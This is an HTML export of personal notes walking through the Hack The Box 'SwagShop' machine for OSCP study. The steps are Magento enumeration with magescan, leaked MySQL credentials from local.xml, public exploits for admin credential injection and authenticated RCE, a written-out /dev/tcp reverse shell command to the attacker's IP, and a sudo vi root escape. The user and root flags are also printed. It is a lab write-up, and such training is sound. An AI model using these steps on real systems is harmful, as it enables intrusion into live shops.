<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>swagshop</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#swagshop">swagshop</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#magento scanner OSI">magento scanner OSI</a></li>
<ol>
<li><a href="#magescan.phar usage">magescan.phar usage</a></li>
<li><a href="#report">report</a></li>
<ol>
<li><a href="#index.php/rss/order/NEW/new">index.php/rss/order/NEW/new</a></li>
<li><a href="#app/etc/local.xml ">app/etc/local.xml </a></li>
<li><a href="#/shell">/shell</a></li>
</ol>
<li><a href="#searchsploit">searchsploit</a></li>
<ol>
<li><a href="#Remote Code execution credential injection">Remote Code execution credential injection</a></li>
<ol>
<li><a href="#run">run</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#running code_exec.py">running code_exec.py</a></li>
<ol>
<li><a href="#burp/debug">burp/debug</a></li>
</ol>
</ol>
<li><a href="#priv esc">priv esc</a></li>
<ol>
<li><a href="#alt privesc">alt privesc</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="swagshop"><h1><b><u>swagshop</u></b></h1><img alt="images/1012-1.png" src="images/1012-1.png"/><br/><img alt="images/1012-2.png" src="images/1012-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><h2>nmap discovers </h2><br/><h2>ssh running on port 22 </h2><br/><h2>and http running on port 80</h2><br/><img alt="images/1013-1.png" src="images/1013-1.png"/><br/><br/><span style="color:#24ff00;">a scan of all ports confirms no other services are running</span><br/><img alt="images/1013-2.png" src="images/1013-2.png"/></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><span style="color:#24ff00;">navigating to</span><span style="color:#ffff00;"> swagshop's </span><span style="color:#24ff00;">webpage shows an online shop run by the popular CMS (content management system) </span><span style="color:#ffff00;">magento</span><span style="color:#24ff00;">, </span><br/><img alt="images/1977-1.png" src="images/1977-1.png"/></div>
<div class="page" id="magento scanner OSI"><h1><b><u>magento scanner OSI</u></b></h1><span style="color:#24ff00;">since magneto is like the </span><span style="color:#ffa500;">wordpress</span><span style="color:#24ff00;"> of market sales websites, lets see if there is a scanner we can find online similar to wps</span><h2><br/><br/></h2><img alt="images/1015-1.png" src="images/1015-1.png"/><br/><br/>magescan is a github repo that can evaluate the security of a magento site, lets grab it<br/><img alt="images/1015-2.png" src="images/1015-2.png"/><img alt="images/1015-3.png" src="images/1015-3.png"/><img alt="images/1015-4.png" src="images/1015-4.png"/><br/>lets move it to our working directory and run it <br/><br/><br/></div>
<div class="page" id="magescan.phar usage"><h1><b><u>magescan.phar usage</u></b></h1><img alt="images/1016-1.png" src="images/1016-1.png"/></div>
<div class="page" id="report"><h1><b><u>report</u></b></h1><span style="color:#24ff00;">as the repo recommends, lets run it with the arguments:</span><br/><span style="color:#ffa500;">./magescan.phar scan:all http:10.10.10.140</span><br/><img alt="images/1017-1.png" src="images/1017-1.png"/><br/><br/><span style="color:#24ff00;">first off we see the magento </span><span style="color:#ffff00;">version is 1.9.0.0/1</span><br/><img alt="images/1017-2.png" src="images/1017-2.png"/><br/><br/><br/><span style="color:#24ff00;">we see there are some reachable url paths that the scan has found for us, lets look into them:</span><br/><img alt="images/1017-3.png" src="images/1017-3.png"/><br/><img alt="images/1017-4.png" src="images/1017-4.png"/><br/><img alt="images/1017-5.png" src="images/1017-5.png"/><br/><br/><span style="color:#24ff00;">which means these url paths are reachable and worth checking out</span><br/><span style="color:#ffa500;">app/etc/local.xml <br/>index.php/rss/order/NEW/new<br/>/shell</span><br/><br/><br/></div>
<div class="page" id="index.php/rss/order/NEW/new"><h1><b><u>index.php/rss/order/NEW/new</u></b></h1><span style="color:#24ff00;">Navigating to </span><span style="color:#ffa500;">/index.php/rss/order/New/new</span><span style="color:#24ff00;"> shows an </span><span style="color:#ffa500;">xml</span><span style="color:#24ff00;"> variant RSS that has an interesting link embedded in it</span><br/><img alt="images/1019-1.png" src="images/1019-1.png"/><br/><img alt="images/1019-2.png" src="images/1019-2.png"/><img alt="images/1019-3.png" src="images/1019-3.png"/><br/><br/><span style="color:#24ff00;">navigating to </span><img alt="images/1019-4.png" src="images/1019-4.png"/> gives us <br/><img alt="images/1019-5.png" src="images/1019-5.png"/></div>
<div class="page" id="app/etc/local.xml "><h1><b><u>app/etc/local.xml </u></b></h1><img alt="images/1018-1.png" src="images/1018-1.png"/><br/><br/><br/><img alt="images/1018-2.png" src="images/1018-2.png"/><br/><br/><span style="color:#24ff00;">we see we have mysql creds here! lets save them</span><br/><span style="color:#ffff00;">root<br/>fMVWh7bDHpgZkyfqQXreTjU9</span><br/><br/><span style="color:#24ff00;">lets try logging in with the creds we found over at </span><span style="color:#ffa500;">/index.php/admin/sales_order</span><br/><br/><img alt="images/1018-3.png" src="images/1018-3.png"/><br/><br/><span style="color:#24ff00;">no luck, this isn't the </span><img alt="images/1018-4.png" src="images/1018-4.png"/> service anyway so this was an attempt to see if the box had reused creds<br/><br/><br/><br/></div>
<div class="page" id="/shell"><h1><b><u>/shell</u></b></h1><img alt="images/1020-1.png" src="images/1020-1.png"/><br/><span style="color:#24ff00;">all these php files load the same message:<br/></span><img alt="images/1020-2.png" src="images/1020-2.png"/><br/>nothing here, lets move on...</div>
<div class="page" id="searchsploit"><h1><b><u>searchsploit</u></b></h1><span style="color:#24ff00;">lets searchsploit magento</span> <br/><br/><img alt="images/1022-1.png" src="images/1022-1.png"/><br/><br/><span style="color:#24ff00;">since we know the version of </span><span style="color:#ffff00;">magento is 1.9.0.0 / 1.9.0.1</span><span style="color:#24ff00;">, these exploits stand out <br/></span><img alt="images/1022-2.png" src="images/1022-2.png"/><br/><br/>we don't have working creds yet so lets try the bottom <span style="color:#ffa500;">RCE</span></div>
<div class="page" id="Remote Code execution credential injection"><h1><b><u>Remote Code execution credential injection</u></b></h1><span style="color:#24ff00;">mirror the file to your working directory with</span><br/><span style="color:#ffa500;">searchsploit -m /xml/webapps/37977.py</span><br/><img alt="images/1024-1.png" src="images/1024-1.png"/><br/><br/><span style="color:#24ff00;">description:</span><br/><img alt="images/1024-2.png" src="images/1024-2.png"/><br/><span style="color:#24ff00;"><br/>perfect, <br/>seems we have to update our </span><span style="color:#ffa500;">target</span><span style="color:#24ff00;">, and the public exploits default </span><span style="color:#ffa500;">injected credentials </span><span style="color:#24ff00;">for good practice</span><br/><img alt="images/1024-3.png" src="images/1024-3.png"/><br/><br/><span style="color:#24ff00;">lets move the </span><span style="color:#ffff00;">exploit</span><span style="color:#24ff00;"> into our directory<br/></span><img alt="images/1024-4.png" src="images/1024-4.png"/><br/><br/>change the exploit name<br/><img alt="images/1024-5.png" src="images/1024-5.png"/><br/><br/><span style="color:#ffff00;">Note: </span><span style="color:#24ff00;">(the webserver is most likely misconfigured because wherever you navigate to any of the links on the page, each leads with index.php in the URL)<br/>Ex:</span><img alt="images/1024-6.png" src="images/1024-6.png"/><img alt="images/1024-7.png" src="images/1024-7.png"/><br/><img alt="images/1024-8.png" src="images/1024-8.png"/><img alt="images/1024-9.png" src="images/1024-9.png"/><br/>so tweak the target to be: <span style="color:#ffa500;">http://10.10.10.140/index.php/ </span><br/><img alt="images/1024-10.png" src="images/1024-10.png"/><br/><br/>and the <span style="color:#ffff00;">username/pass </span><span style="color:#24ff00;">to be w.e you want</span><br/><img alt="images/1024-11.png" src="images/1024-11.png"/><br/><br/><img alt="images/1024-12.png" src="images/1024-12.png"/><br/><br/><br/><br/></div>
<div class="page" id="run"><h1><b><u>run</u></b></h1><span style="color:#24ff00;">time to run </span><br/><span style="color:#ffa500;">python cred_inject.py</span><br/><img alt="images/1023-1.png" src="images/1023-1.png"/><br/><span style="color:#24ff00;"><br/>there are a bunch of invalid characters in the code that are mostly slashes, after removing each of them...<br/></span><img alt="images/1023-2.png" src="images/1023-2.png"/><br/><br/>now lets try logging in:<br/><img alt="images/1023-3.png" src="images/1023-3.png"/><br/><br/>we're logged in as <span style="color:#ffff00;">admin</span><span style="color:#24ff00;">!</span></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">now that we have </span><span style="color:#ffff00;">working credentials</span><span style="color:#24ff00;">, lets go back to the </span><span style="color:#ffa500;">authenticated RCE exploit</span><span style="color:#24ff00;"> we found off </span><span style="color:#ffa500;">searchsploit</span><br/><img alt="images/1025-1.png" src="images/1025-1.png"/><br/><br/>checking out the exploit we see a couple of things:<br/><img alt="images/1025-2.png" src="images/1025-2.png"/><br/><br/>lets rename it to <br/><img alt="images/1025-3.png" src="images/1025-3.png"/><br/><br/>we see the config parameters but notice <span style="color:#ffa500;">install_date</span><span style="color:#24ff00;">, we're gonna have to grab the date from the</span><span style="color:#ffa500;"> /app/etc/local.xml</span><span style="color:#24ff00;"> file<br/></span><img alt="images/1025-4.png" src="images/1025-4.png"/><br/>the date from the xml file <img alt="images/1025-5.png" src="images/1025-5.png"/><br/><br/>so tweaking the config section of the code to look like this<br/><img alt="images/1025-6.png" src="images/1025-6.png"/><br/><br/><br/>the payload in the exploit is an object injection as <span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;"> mentioned, there's no need to understand it becfause it is beyond the scope of what the OSCP expects you to know but I may add that too the writeup later:<br/></span><img alt="images/1025-7.png" src="images/1025-7.png"/><br/><br/>all we need to know is the usage:<br/><img alt="images/1025-8.png" src="images/1025-8.png"/><br/><br/><br/><br/></div>
<div class="page" id="running code_exec.py"><h1><b><u>running code_exec.py</u></b></h1><img alt="images/1026-1.png" src="images/1026-1.png"/><br/><span style="color:#24ff00;">ignore that code argument syntax, should look like this:<br/></span><img alt="images/1026-2.png" src="images/1026-2.png"/><br/><br/>lets send this through the proxy and see whats going on to do that, uncomment the <span style="color:#ffa500;">proxy line</span><span style="color:#24ff00;">:<br/></span><img alt="images/1026-3.png" src="images/1026-3.png"/><br/><br/>and fire up <span style="color:#ffa500;">burp suite</span></div>
<div class="page" id="burp/debug"><h1><b><u>burp/debug</u></b></h1><span style="color:#24ff00;">lets start with a simple </span><span style="color:#ffa500;">whoami</span><span style="color:#24ff00;"> cmd</span><br/><img alt="images/1027-1.png" src="images/1027-1.png"/><span style="color:#24ff00;"><br/><br/></span><img alt="images/1027-2.png" src="images/1027-2.png"/><img alt="images/1027-3.png" src="images/1027-3.png"/><br/><br/>we see the code isn't getting past the GET before erroring out, and looking at the exploit, the target variable doesn't add the correct exploit URL to the argument so we have to adjust our <span style="color:#ffa500;">target</span><span style="color:#24ff00;"> parameter to the admin page </span><img alt="images/1027-4.png" src="images/1027-4.png"/><br/><br/><br/>after that i got a strange <span style="color:#ff0000;">error</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;"> didn't come accross that showed more than one control was taking up my username variable<br/></span><img alt="images/1027-5.png" src="images/1027-5.png"/><br/><br/>but after some research it turns out the username was being called twice<br/><img alt="images/1027-6.png" src="images/1027-6.png"/><br/>commenting this line out fixed the ambiguity error<br/><br/><img alt="images/1027-7.png" src="images/1027-7.png"/><br/><br/>looks like were going to have to debug the code from here, ippsec puts a <span style="color:#ffa500;">break</span><span style="color:#24ff00;"> in the code using </span><span style="color:#ffa500;">pdb</span><br/><img alt="images/1027-8.png" src="images/1027-8.png"/><br/><br/><img alt="images/1027-9.png" src="images/1027-9.png"/><br/><br/>then when we run the code <span style="color:#ffa500;">pdb.set_trace() </span><span style="color:#24ff00;">lets us check what is stored in our tunnel variable<br/></span><img alt="images/1027-10.png" src="images/1027-10.png"/><img alt="images/1027-11.png" src="images/1027-11.png"/><br/><br/>and there's <span style="color:#ff0000;">nothing</span><span style="color:#24ff00;"> stored in our tunnel variable, but why? the code developer mentioned that the date in the </span><span style="color:#ffa500;">local.xml </span><span style="color:#24ff00;">file had to be as recent as possible, so maybe it's not recent enough?<br/><br/><br/></span><img alt="images/1027-12.png" src="images/1027-12.png"/><br/>the request code shows the period of time needs to be <span style="color:#ffff00;">7d</span><span style="color:#24ff00;"> within the date_issued variable, but what happens when we set it to </span><span style="color:#ffff00;">2years</span><span style="color:#24ff00;"> instead to extend the grace period?<br/></span><img alt="images/1027-13.png" src="images/1027-13.png"/><br/><br/><img alt="images/1027-14.png" src="images/1027-14.png"/><br/>tunnel now has an object attached to it and continuing the program gives us:<br/><br/>lets try <span style="color:#ffa500;">whoami</span><br/><img alt="images/1027-15.png" src="images/1027-15.png"/><br/><span style="color:#ffff00;">www-data</span><span style="color:#24ff00;"> gets returned! we have code execution!<br/><br/>now run our reverse shell and...<br/></span><span style="color:#ffa500;">python code_exec.py http://10.10.10.140/index.php/admin 'bash -i "bash -c &gt;&amp; /dev/tcp/10.10.14.62/9001 0&gt;&amp;1"'</span><br/><img alt="images/1027-16.png" src="images/1027-16.png"/><br/><img alt="images/1027-17.png" src="images/1027-17.png"/><br/>a shell!!<br/></div>
<div class="page" id="priv esc"><h1><b><u>priv esc</u></b></h1><span style="color:#24ff00;">now that we have a foothold, lets see what kind of permissions we have<br/><br/></span><img alt="images/1029-1.png" src="images/1029-1.png"/><br/><br/>since we're allowed to run vi with root privileges on any file withint the /var/ww/html directory, lets create our own file and use vi to edit it and escape it to gain a shell with <span style="color:#ffff00;">root</span><span style="color:#24ff00;"> privileges</span><br/><img alt="images/1029-2.png" src="images/1029-2.png"/><br/><br/><a href="https://gtfobins.github.io/gtfobins/vi/#sudo">GTFObins</a><span style="color:#24ff00;"> is a great resource for escaping </span><span style="color:#ffa500;">binaries</span><span style="color:#24ff00;"> with misconfigured security settings</span><br/><img alt="images/1029-3.png" src="images/1029-3.png"/><br/><br/><span style="color:#24ff00;">type </span><span style="color:#ffa500;">:! </span><span style="color:#24ff00;">to execute code through vi and then open bash from there and...</span><br/><img alt="images/1029-4.png" src="images/1029-4.png"/><br/><img alt="images/1029-5.png" src="images/1029-5.png"/><br/><span style="color:#24ff00;">we are </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!!</span><br/><br/><br/><br/></div>
<div class="page" id="alt privesc"><h1><b><u>alt privesc</u></b></h1><span style="color:#24ff00;">thanks to Msphr in the youtube comments we can also use '</span><span style="color:#ffa500;">../</span><span style="color:#24ff00;">' to navigate to any file on the box with vi<br/><br/></span><span style="color:#ffa500;">sudo vi /var/www/html/../../../root/root.txt</span><br/><img alt="images/1031-1.png" src="images/1031-1.png"/><br/><br/><img alt="images/1031-2.png" src="images/1031-2.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1030-1.png" src="images/1030-1.png"/><br/><span style="color:#ffff00;">a448877277e82f05e5ddf9f90aefbac8</span><br/><br/><img alt="images/1030-2.png" src="images/1030-2.png"/><br/>gotta love the shirt<br/><span style="color:#ffff00;">c2b087d66e14a652a3b86a130ac56721</span></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1978-1.png" src="images/1978-1.png"/></div>
